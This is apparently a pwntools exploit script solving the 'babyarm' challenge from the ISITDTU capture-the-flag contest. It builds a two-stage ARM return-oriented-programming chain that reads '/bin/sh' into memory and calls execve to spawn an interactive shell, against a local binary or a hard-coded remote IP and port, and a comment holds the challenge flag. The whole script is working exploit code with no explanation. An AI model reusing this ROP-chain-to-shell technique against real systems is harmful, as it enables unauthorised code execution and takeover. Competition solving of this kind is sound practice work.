#!/usr/bin/python
from pwn import *
import sys

HOST = "51.15.237.57"
PORT = 2226

#pop {r0, r1, r2, r3, r4, r5, pc};
POPALL = 0x0004a9e8
POPR7 = 0x000104f2
#svc #0; pop {r7, pc}; 
SVCPOPR7PC = 0x00010b14
POPR3 = 0x0001e006

"""
Stage1 ropchain: read /bin/sh to bss
Stage2 ropchain: execve("/bin/sh")
"""

# ISITDTU{1253baf13c787330470724ac0113d0bcc6f4ee89}
def exploit(r):
	r.recvuntil("Input:")
	
	# read(0, 0x78950, 0x100)	
	payload = "A"*4
	payload += p32(0x78950)
	payload += p32(POPALL+1)	
	payload += p32(0x0)
	payload += p32(0x00078950)
	payload += p32(0x100)
	payload += p32(0x0)
	payload += p32(0x0)
	payload += p32(POPR7+1)
	payload += p32(3)
	payload += p32(SVCPOPR7PC+1)

	# execve(0x78950, 0, 0)
	payload += p32(11)				# execve
	payload += p32(POPALL+1)
	payload += p32(0x78950)
	payload += p32(0)
	payload += p32(0)
	payload += p32(0)
	payload += p32(0)
	payload += p32(POPR7+1)
	payload += p32(11)
	payload += p32(SVCPOPR7PC+1)

	r.sendline(payload)

	pause()
	
	# send /bin/sh to be stored at 0x78950
	r.sendline("/bin/sh\x00")

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./babyarm")

	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./babyarm")
		print util.proc.pidof(r)
		pause()
		exploit(r)
